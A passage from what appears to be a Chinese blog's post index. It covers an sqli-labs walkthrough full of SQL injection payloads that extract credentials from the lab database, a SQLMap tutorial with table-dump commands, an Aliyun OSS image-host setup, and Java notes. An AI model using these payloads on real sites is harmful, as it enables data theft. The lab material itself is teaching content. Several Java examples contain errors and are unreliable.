if(exp1, exp2, exp3)：如果exp1是True，则返回exp2；否则返回exp3。 数据库名的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+ 表名的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1)&#x3D;&#39;u&#39;, sleep(3), 1) --+ 字段的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1), 8)&#x3D;&#39;username&#39;, sleep(3), 1) --+ 数据的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1), 4)&#x3D;&#39;dumb&#39;, sleep(3), 1) --+ Less-10 基于时间的GET双引号盲注 基于时间的双引号盲注，只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。 Less-11 基于错误的POST型单引号字符型注入 测试登录成功，有数据库的数据回显信息，那么就可以尝试使用联合查询注入： 再使用admin'判断注入点： 这里我们使用burpsuite抓包，发送到repeater模块修改POST参数。 方法一 单引号报错注入 爆库payload 1uname&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 爆表payload 1uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 爆列名payload 1uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 爆值payload 1uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(username, 0x3a, password) from users))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 记录值获取个数有限 方法二 使用联合查询 1uname&#x3D;0&#39; union select 1,2 --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 注意uname值是错误的时候，才能正确显示联合查询的内容 举一个🌰： 1uname&#x3D;0&#39; union select 1,database() --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 其他的payload类似。 Less-12 基于错误的POST型双引号字符型变形注入 方法一 双引号报错注入 按照题意把Less-11中payload的单引号改为双引号应该就能注入，但是在实际操作中，发现无论是用--+还是#还是0x23都不能注释掉后面的内容。 查看一下PHP文件： 1234$uname = &#x27;&quot;&#x27;+$uname+&#x27;&quot;&#x27;;$passwd = &#x27;&quot;&#x27;+$passwd+&#x27;&quot;&#x27;;@$sql = &quot;SELECT username, password from users where username=($uname) and password=($passwd) limit 0,1&quot;; 构造一个能闭合而且报错的payload： 12admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; 所以SQL查询语句就变成了： 12select username, password from users where username&#x3D;&quot;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;&quot; and password&#x3D;($passwd) limit 0,1 还是在Burpsuite的repeater模块中修改POST参数： 爆库payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 爆表payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 爆列名payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 爆值payload 12uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(username, &#39;::&#39;, password) from users))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 方法二 使用联合查询 根据SQL查询语句可以构造一个联合查询注入的payload： 12uname&#x3D;admin5&quot;) union select 1,database() --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 其他的payload替换查询语句即可。 Less-13 POST单引号变形双注入 当输入正确信息时发现没有回显信息，所以不能用联合查询，但可以使用时间盲注。 使用admin' and 1=1判断注入点： 通过报错信息可以知道需要一个)来闭合查询语句，在尝试admin') and 1=1 and ('： 可以发现数据库不报错，SQL语句可以正常执行。由此，我们可以使用报错注入。 方法一 报错注入 12uname&#x3D;admin&#39;) and extractvalue(1, concat(0x7e, (select database()))) and (&#39; 在concat()中构造查询语句，和less-12以及之前的报错型注入一样，不再赘述。 方法二 时间盲注 12uname&#x3D;admin&#39;) and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-14 POST单引号双注入 先尝试使用admin&quot;) and 1=1 (&quot;： 通过报错信息可以看出， 输入内容被放到双引号中 ，再次尝试`admin&quot; and 1=1#： 而使用admin&quot; and 1=2#发现登录失败。 方法一 报错注入 使用extracvalue函数： 12uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 使用floor函数： 12uname&#x3D; &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 方法二 时间盲注 12uname&#x3D;admin&quot; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-15 基于布尔型或时间延迟单引号POST型注入 无论怎么输入都没有回显—&gt;时间延迟注入。 延迟测试payload： 12uname&#x3D;admin&#39; and sleep(5) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 页面延迟明显，确定使用时间盲注： 1234567891011uname&#x3D;admin&#39; and if(length(database())&#x3D;8,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit uname&#x3D;admin&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit uname&#x3D;admin&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-16 基于布尔型或时间延迟的双引号POST型盲注 把Less-15的单引号改成双引号即可。 另外还可以使用 万能账号绕过密码验证admin&quot;)# 验证。 Less-17 基于错误的更新查询POST注入 无论怎么输入也没有错误回显，查阅index.php源码可以看到check_input函数对参数uname进行的处理，仔细一下这个函数的源码： 第一步，只截取前15个字符； 第二步，首先介绍get_magic_quotes_gpc()函数的作用： 当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1 当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0 get_magic_quotes_gpc()函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的误。 也就是说，在magic_quotes_gpc = On的情况下，如果输入的数据有单引号'、双引号&quot;、反斜线\\与 NULL等字符都会被加上反斜线。 第三步，stripslashes()函数删除反斜线； 第四步，ctype_digit()函数 判断是否是数字，是数字就返回true，否则返回false； 第五步， intval()整型转换。 对username搞了这么多花里胡哨的操作，但是password字段还是光秃秃的，使用updatexml()函数对password字段进行注入。 爆库payload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, database(), 0x7e),1)--+ &amp;submit&#x3D;Submit 爆表名payload 1uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) --+ &amp;submit&#x3D;Submit 爆列名payload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1) --+ &amp;submit&#x3D;Submit 爆值payload 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &amp;submit&#x3D;Submit 发现有报错： 12You can&#39;t specify target table &#39;tablename&#39; for update in FROM clause 这是因为在MySQL里，不能先SELECT一个表的记录，在按此条件进行更新和删除同一个表的记录。网上的解决办法是，将SELECT得到的结果，再通过中间表SELECT一遍，即： 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select group_concat(password) from users)),0x7e),1) --+ &amp;submit&#x3D;Submit 但是又出现了新的错误信息： 在做多表查询，或者查询的时候产生新的表的时候会出现这个错误：Every derived table must have its own alias（每一个派生出来的表都必须有一个自己的别名）。 最终payload： 12uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as test),0x7e),1) --+&amp;submit&#x3D;Submit Less-18 基于错误的Uagent头部字段POST注入 如果登录正常的话，会显示UserAgent字段的信息： 抓包修改user-agent为一下payload就可以了： 12&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39; 其他的payload类似。 Less-19 基于错误的Reference头部字段POST注入 本题和上一题很像，回显是referer，查一下php文件可以发现，insert语句中向数据库插入了referer，所以注入点改为referer，paylaod和上一题完全一样，也可以参照less-12，将其双引号改为单引号作为本题payload，不再赘述。 Less-20 基于错误的Cookie头部字段POST注入 登录成功后的页面： 再查看一下PHP文件： 用Burpsuite抓包改参数： 发现有数据库错误回显，构造payload： 另外还可以使用联合查询，首先判断列数： 再来构造一个样例payload：","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"阿里云OSS+PicGo搭建Markdown图床","date":"2019-10-18T14:23:29.000Z","path":"Other/2.阿里云OSS-PicGo搭建Markdown图床/","text":"阿里云OSS+PicGo搭建Markdown图床 用一个图床崩一个，实在是不能忍了，一怒之下决定用阿里云OSS来搭建一个图床，稳定又方便~ 步骤： 购买阿里云OSS，40G存储空间9元/年（流量费用另算） 创建OSS专用用户，专门用于访问OSS，注意保存AccessKey和AccessKeySecret 下载阿里官方的OSS Browser管理客户端，并配置连接信息 创建Bucket，注意权限设置为公共读 在GitHub下载PicGo客户端并安装配置 购买阿里云OSS 价格： 40G 9元/年 100G 99元/年 500G 486元/年 1T 999元/年 到阿里云官网找OSS入口即可： https://www.aliyun.com/product/oss?spm=5176.12825654.h2v3icoap.36.7b652c4aagSnXx&amp;aly_as=7HZ6xxr8 创建专用用户（可选） 进入控制台后，鼠标悬浮在右上角的用户头像，选择访问控制 然后在左侧：人员管理-&gt;用户：新建用户 输入登录名称和显示名称，点击确认按钮，要求手机验证码。 创建成功后，点击返回，然后回到用户列表。 点击进入刚刚创建的用户，选择权限管理，点击添加权限，搜索AliyunOSSFullAccess，添加，确认。 选择认证管理，点击最下面的创建新的AccessKey，会生成AccessKeyID和AccessKeySecret，AccessKeySecret是无法找回的，所以一定要保存好。 创建Bucket 进入OSS控制台：https://oss.console.aliyun.com/overview 点击加号，创建Bucket。 注意： Bucket名称要全局唯一 区域最好选择离你近的 权限选择公共读，这样子图片别人才能访问得到 安装OSS Browser客户端 OSS Browser是阿里云官方的客户端工具，可以使用拥有OSS权限的用户登录，从而免去登录官网控制台的麻烦。 OSS Browser Windows64下载地址： http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip OSS常用工具汇总： https://help.aliyun.com/document_detail/44075.html 安装完成之后，输入AccessKey、AccessKeySecret登录即可，其他都是可选项。 可以新建Bucket、上传文件、上传文件夹等等。 安装PicGo PicGo是一个支持多种图床的客户端图片上传工具，可以实现快速上传图片到指定图床，并将链接保存到剪贴板。 GitHub地址： https://github.com/Molunerfinn/PicGo Release地址： https://github.com/Molunerfinn/PicGo/releases Windows的下载picgo-setup-2.1.2.exe下载安装即可 设置参考图片即可： 这里最坑的地方就在于确定存储区域这一项，并不是OSS控制台中的Endpoint外网访问的全部地址，而是.aliyuncs.com前面的值！！！ 设定自定义域名后，生成的链接会自动用自定义的域名替换。 当使用截图工具截图后，会保存到剪贴板，这时按下快捷键，PicGo就会自动上传图片，然后将指定格式的链接地址放到剪贴板，直接粘贴到Markdown文档即可。 点击右上角的➕，会变成浮窗，将图片直接拖到浮窗就能上传。","tags":[{"name":"OSS","slug":"OSS","permalink":"http://ca0y1h.top/tags/OSS/"}],"categories":[{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Java基础学习之异常处理","date":"2019-10-14T08:21:15.000Z","path":"Java/code/4.Java基础学习之异常处理/","text":"Java基础学习之异常处理 Java的异常 Java标准库中常用的异常： 异常是一种class，它的继承关系如下： Throwable有两个子类：Error和Exception。 Error表示严重的错误，例如： OutOfMemoryError：内存耗尽 NoClassDefFountError：无法加载某个Class StackOverflowError：栈溢出 Exception表示运行时错误，它可以被捕获并处理。 程序逻辑处理相关： NumberFormatException：数值类型的格式错误 FileNotFoundException：未找到文件 SocketException：读取网络失败 以及程序逻辑编写错误： NullPointerException：对某个null的对象调用方法或字段 IndexOutOfBoundsException：数组索引越界 Java规定： 必须捕获的异常包括：Exception及其子类，除了RuntimeExcetion及其子类。 不需要捕获的异常包括：Error及其子类，RuntimeExcetion及其子类。 捕获异常 捕获异常使用try...catch语句，把可能发生异常的代码放到try &#123;...&#125;中，然后使用catch捕获对应的Exception及其子类 ： 123456789101112131415161718192021import java.io.UnsupportedEncodingException;import java.util.Arrays;public class Main &#123; public static void main(String[] args) &#123; byte[] bs = toGBK(&quot;中文&quot;); System.out.println(Arrary.toString(bs)); &#125; static byte[] toGBK(String s) &#123; try &#123; return s.getBytes(&quot;GBK&quot;); &#125; catch (UnsupportedEncodingException e) &#123; System.out.println(e); return s.getBytes(); //使用默认编码 &#125; &#125;&#125;// 输出// [-42, -48, -50, -60] 如果我们不捕获UnsupportedEncodingException，则会出现编译失败，这是因为String.getBytes()方法的定义是： 123public byte[] getBytes(String charsetName) throws UnsupportedEncodingException &#123; ...&#125; 所以调用方在调用的时候，必须强制捕获这些异常，否则编译器会报错。 多catch语句 可以使用多个catch语句，每个catch捕获相对应的异常，但是，多个catch语句只有一个能被执行。所以存在多个catch时候，catch的顺序非常重要：子类必须写在前面。例如： 12345678public static void main(String[] args) &#123; try &#123; ... &#125; catch (IOExcetion c) &#123; System.out.println(&quot;IO error&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // 永远捕获不到 System.out.println(&quot;Bad encoding&quot;);&#125; 因为UnsupportedEncodingException是IOExcetion的子类，所以当抛出UnsupportedEncodingException异常时，会被catch (IOException e) &#123; ... &#125;捕获并执行。 finally语句 无论是否有异常发生，如果我们都希望执行一些语句，可以使用finally语句，例如： 12345678910111213public static void main(String[] args) &#123; try &#123; process1(); process2(); process3(); &#125; catch (UnsupportedEncodingException e) &#123; System.out.println(&quot;Bad encoding&quot;); &#125; catch (IOException e) &#123; System.out.println(&quot;IO error&quot;); &#125; finally &#123; System.out.println(&quot;END&quot;); &#125;&#125; 如果某些异常的处理逻辑相同，但是异常本身不存在继承关系，我们可以使用|来合并： 1234567891011public static void main(String[] args) &#123; try &#123; process1(); process2(); process3(); &#125; catch (IOException | NumberFormatException e) &#123; // IOException或NumberFormatException System.out.println(&quot;Bad input&quot;); &#125; catch (Exception e) &#123; System.out.println(&quot;Unknown error&quot;); &#125;&#125; 抛出异常 抛出异常分为两步： 创建某个Excetion实例； 用throw语句抛出。 例如： 12345void process(String s) &#123; if (s == null) &#123; throw new NullPointerExcetion(); &#125;&#125; 异常转换 12345678910111213void process1(String s) &#123; try &#123; process2(); &#125; catch (NullPointerExcetion e) &#123; throw new IllegalArgumentExcement; &#125;&#125;void process2(String s) &#123; if (s==null)&#123; throw new NullPonterExcetion(); &#125;&#125; 当process2()抛出NullPointerException后，被process1()捕获，然后抛出IllegalArgumentException()。 如果在main()中捕获IllegalArgumentException，我们看看打印的异常栈： 123456789101112131415161718192021public class Main &#123; public static void main(String[] args) &#123; try &#123; process1(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; static void process1() &#123; try &#123; process2(); &#125; catch (NullPointerException e) &#123; throw new IllegalArgumentException(); &#125; &#125; static void process2() &#123; throw new NullPointerException(); &#125;&#125; 异常栈如下： 1234567891011java.lang.IllegalArgumentException at Main.process1(Main.java:15) at Main.main(Main.java:5) at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base&#x2F;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base&#x2F;java.lang.reflect.Method.invoke(Method.java:567) at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.execute(Main.java:415) at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.run(Main.java:192) at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.main(Main.java:132) 我们已经看不到原始异常NullPointerException的信息了。 为了能追踪到完整的异常栈，在构造异常的时候，把原始的Exception实例传进去，新的Exception就可以持有原始Exception信息。 即： 12345678static void process1() &#123; try &#123; process2(); &#125; catch (NullPointerException e) &#123; throw new IllegalArgumentException(e); &#125; &#125; 异常栈如下： 1234567java.lang.IllegalArgumentException: java.lang.NullPointerException at Main.process1(Main.java:15) at Main.main(Main.java:5)Caused by: java.lang.NullPointerException at Main.process2(Main.java:20) at Main.process1(Main.java:13) 自定义异常 一个常见的做法是自定义一个BaseException作为“根异常”，然后，派生出各种业务类型的异常。 BaseException需要从一个适合的Exception派生，通常建议从RuntimeException派生： 123public class BaseException extends RuntimeExcetion &#123;&#125; 其他业务类型的异常就可以从BaseException派生： 12345678public class UserNotFoundException extends BaseException &#123;&#125;public class LoginFailedException extends BaseException &#123;&#125;... 使用JDK Logging 直接上🌰 12345678910111213import java.util.logging.Level;import java.util.logging.Logger;public class Hello &#123; public static void main(String[] args) &#123; Logger logger = Logger.getGlobal(); logger.info(&quot;start process...&quot;); logger.warning(&quot;memory is running out...&quot;); logger.fine(&quot;ignore&quot;); logger.severe(&quot;process will be terminated...&quot;); &#125;&#125; 输出： 123456710月 12, 2019 6:34:55 下午 Hello main信息: start process...10月 12, 2019 6:34:55 下午 Hello main警告: memory is running out...10月 12, 2019 6:34:55 下午 Hello main严重: process will be terminated... logger.fine(&quot;ignore&quot;);没有打印是因为JDK默认的消息级别是Info： SEVERE WARNING INFO CONFIG FINE FINER FINEST 使用Common Logging 使用 Common Logging只需要两个步骤： 通过LogFactory获取Log类的实例 使用Log实例的方法打印日志 1234567891011import org.apache.commons.logging.Log;import org.apache.commons.logging.LogFactory;public class Main &#123; public static void main(String[] args) &#123; Log log = LogFactory.getLog(Main.class); log.info(&quot;start...&quot;); log.warn(&quot;end...&quot;); &#125;&#125; Commons Logging定义了6个日志级别： FATAL ERROR WARNING INFO DEBUG TRACE 使用Common Logging时，如果在静态方法中引用Log，通常直接定义一个静态类型变量： 12345678public class Main&#123; static final Log log = LogFactory.getLog(Main.class); static void foo()&#123; log.info(&quot;foo&quot;); &#125;&#125; 在实例方法中引用Log，通过定义一个实例变量： 12345678public class Person &#123; protected final Log = LogFactory.getLog(getClass()); void foo()&#123; log.info(&quot;foo&quot;); &#125;&#125; 这两种定义的方法区别在于：实例变量log获取方式是LogFactory.getLog(getClass)，这种做法的好处是，子类可以直接使用log实例，例如： 123456public class Student extends Person &#123; void bar() &#123; log.info(&quot;bar&quot;); &#125;&#125; 此外，Commons Logging的日志方法，例如info()，除了标准的info(String)外，还提供了一个非常有用的重载方法：info(String, Throwable)，这使得记录异常更加简单： 123456try &#123; ...&#125; catch (Exception e) &#123; log.error(&quot;got Exception&quot;, e);&#125; 使用Log4j Commons Logging，可以作为“日志接口”来使用，而实现这个接口可以使用Log4j。 我们在使用Log4j框架时，更多时候是通过配置文件来配置它。 以XML配置为例，使用Log4j的时候，我们把一个log4j2.xml的文件放到classpath下就可以让Log4j读取配置文件并按照我们的配置来输出日志。 另外，因为Log4j也是一个第三方库，需要把下面4个jar包放在classpath中： log4j-api-2.x.jar log4j-core-2.x.jar log4j-jcl-2.x.jar commons-logging-1.2.jar 使用SLF4J和Logback SLF4J类似于Commons Logging，也是一个日志接口，而Logback类似于Log4j，是一个日志的实现。 SLF4J使用方法如下： 12345678910111213import org.slf4j.Logger;import org.slf4j.LoggerFactory;class Main &#123; final Logger = LoggerFactory.getLogger(getClass()); void foo() &#123; int bar = 100; String name = &quot;foo&quot;; logger.info(&quot;bar = &#123;&#125; name = &#123;&#125;&quot;, bar, name); &#125;&#125; SLF4J使用下面三个jar包： slf4j-api-1.7.x.jar logback-classic-1.2.x.jar logback-core-1.2.x.jar 和Log4j类似，我们仍然需要一个Logback的配置文件，把logback.xml放到classpath下。","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"编程/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"Web安全学习之SQLMap入门学习","date":"2019-10-11T08:47:22.000Z","path":"Web_security/basic_learning/10.SQLMap入门学习/","text":"Web安全学习之SQLMap入门学习 SQLMap注入神器，先就简单的介绍一下最最最最基础的用法，等图书馆什么时候收录了《SQLMap从入门到精通》这本书，再认真研究这个工具（其实看到这个书名就有点不适）。 使用SQLMap 使用sqli-labs的数据库和页面作为示例。 已知存在注入点http://localhost/sqlilabs/Less-1/，使用SQLMap对其提取管理员数据，具体步骤如下： 第一步：判断是否是注入点 sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; 使用-u参数指定URL，如果URL存在注入点，将会显示出Web容器，数据库版本信息，如下所示： 第二步：获取数据库 sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dbs 使用--dbs参数读取数据库，如下： 第三步：查看当前应用程序所用数据库 sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --current-db 第四步：列出指定数据库的所有表 sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --tables -D &quot;security&quot; 使用--table参数获取数据库表，-D参数指定数据库，如下： 第五步：读取指定表中的字段名称 sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --columns -T &quot;users&quot; -D &quot;security&quot; 使用--columns参数列取字段名，如下： 第六步：读取指定字段内容 sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dump -C &quot;username, password&quot; -T &quot;users&quot; -D &quot;security&quot; --dump意味转存数据，-C指定字段名称，-T指定表名，-D指定数据库名称。 在读取数据后，SQLMap会把读取的数据转存到SQLMap/output/目录下。","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"SQLMap","slug":"SQLMap","permalink":"http://ca0y1h.top/tags/SQLMap/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Java基础学习之核心类","date":"2019-10-11T08:14:01.000Z","path":"Java/code/2.Java基础学习之核心类/","text":"Java基础学习之核心类 字符串 String是一个引用类型，也是一个类，它的一个重要特点就是不可变，这种不可变性是通过内部的private final char[]字段，以及没有任何修改char[]的方法实现的。 字符串比较 当我们想要比较两个字符串是否相同时，要特别注意，我们实际上是想比较字符串的内容是否相同。必须使用equals()方法而不能用==。 12345678public class Main() &#123; public static void main(String[] args) &#123; String s1 = &quot;hello&quot;; String s2 = &quot;HELLO&quot;.toLowerCase(); System.out.println(s1 == s2); System.out.println(s1.equals(s2)); &#125;&#125; 要忽略大小写比较，使用equalsIgnoreCase()方法。 搜索子串的例子： 1234&quot;Hello&quot;.indexof(&quot;l&quot;); // 2&quot;Hello&quot;.lastIndexof(&quot;l&quot;); //3&quot;Hello&quot;.startsWith(&quot;He&quot;); // true&quot;Hello&quot;.endsWith(&quot;lo&quot;); //true 提取子串的例子： 12&quot;Hello&quot;.substring(2); //&quot;llo&quot;&quot;Hello&quot;.substring(2, 4); //&quot;llo&quot; 去除首尾空白字符 使用trim()方法可以移除字符串首尾空白字符。空白字符包括空格，\\t，\\r，\\n。 注意：trim()并没有改变字符串的内容，而是返回了一个新字符串。 另一个strip()方法也可以移除字符串首尾空白字符，包括中文的空格字符\\u3000。 String还提供了isEmpty()和isBlank()来判断字符串是否为空和空白字符串。 替换子串 使用replace()方法可以根据字符或字符串替换： 123String s = &quot;hello&quot;;s.replace(&#x27;l&#x27;, &#x27;w&#x27;); // &quot;hewwo&quot;s.replace(&#x27;ll&#x27;, &quot;~~&quot;); // &quot;he~~o&quot; 分割字符串 split()方法根据匹配给定的正则表达式来拆分字符串。注意： . 、 |和 * 等转义字符，必须得加 \\\\。 12String s = &quot;A,B,C,D&quot;;String[] ss = s.split(&quot;\\\\,&quot;); // &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;&#125; 拼接字符串 拼接字符串使用静态方法join()，它用指定的字符串连接字符串数组： 12String[] arr = &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;;String s = String.join(&quot;***&quot;, arr); // &quot;A***B***C&quot; 类型转换 静态方法valueOf()可以吧任意基本类型或引用类型转换为字符串。 1234String.valueOf(123); //&quot;123&quot;String.valueOf(45.67); //&quot;45.67&quot;String.valueOf(true); //&quot;true&quot;String.valueOf(new Object()); //java.lang.Object@40f08448 字符串转换为int类型： 12int n1 = Integer.parseInt(&quot;123&quot;); //123int n2 = Integer.parseInt(&quot;ff&quot;, 16); //按十六进制转换，255 字符串转换为boolean类型： 123boolean b1 = Boolean.parseBoolean(&quot;true&quot;);boolean b2 = Boolean.parseBoolean(&quot;FALSE&quot;); 转换为char[] String和char可以互相转换： 123char[] cs = &quot;Hello&quot;.toCharArray();String s = new String(cs); 如果修改了char[]数组，String并不会改变： 1234567891011121314public class Main &#123; public static void Main(String[] args) &#123; char[] cs = &quot;Hello&quot;.toCharArray(); String s = new String(cs); System.out.println(s); cs[0] = &#x27;X&#x27;; System.out.println(s); &#125;&#125;// 输出// Hello// Hello 这是因为通过new String(char[])创建新的String实例时，它并不会直接引用传入的char[]数组，而是会复制一份，所以，修改外部的char[]数组不会影响String实例内部的char[]数组，因为这是两个不同的数组。 所以，如果传入的对象有可能改变，我们需要复制而不是直接引用，例如： 1234567891011121314151617181920212223242526import java.util.Arrays;public class Main &#123; public static void main(String[] args) &#123; int[] scores = new int[] &#123;88, 99, 11, 22, 33&#125;; Score s = new Score(scores); s.printScores(); scores[2] = 55; s.printScores; &#125;&#125;class Score &#123; private int[] scores; public Score(int[] scores) &#123; this.scores = scores; &#125; public void printScores() &#123; System.out.println(Arrays.toString(scores)); &#125;&#125;// 输出// 88, 99, 11, 22, 33// 88, 99, 55, 22, 33 观察两次输出，由于Score内部直接引用了外部传入的int[]数组，这会造成外部代码对int[]数组的修改，影响到Score类的字段。正确的构造函数如下： 1234public Score(int[] scores) &#123; this.scores = scores.clone(); &#125; StringBuilder StringBuilder是一个可变对象，能高效拼接字符串，往StringBuilder中新增字符时，不会创建新的临时对象。 1234567891011StringBuilder sb = new StringBuilder(1024);for (int i = 0; i &lt; 1000; i++) &#123; sb.append(&#x27;,&#x27;); sb.append(i);&#125;String s = sb.toString();System.out.println(s);// 输出// 0,1,2,3...999 此外，StringBuilder还可以进行链式操作： 1234567891011121314public class Main &#123; public static void main(String[] args) &#123; var sb = new StringBuilder(1024); sb.append(&quot;Mr&quot;) .append(&quot;Bob&quot;) .append(&quot;!&quot;) .insert(0, &quot;Hello, &quot;); System.out.println(sb.toString()); &#125;&#125;// 输出// Hello, Mr Bob! 支持链式操作的关键可以从StringBuilder源码看出： 12345678910111213141516public StringBuilder append(String str) &#123; super.append(str); return this; &#125; public AbstractStringBuilder append(String str) &#123; if (str == null) &#123; return appendNull(); &#125; int len = str.length(); ensureCapacityInternal(count + len); putStringAt(count, str); count += len; return this; 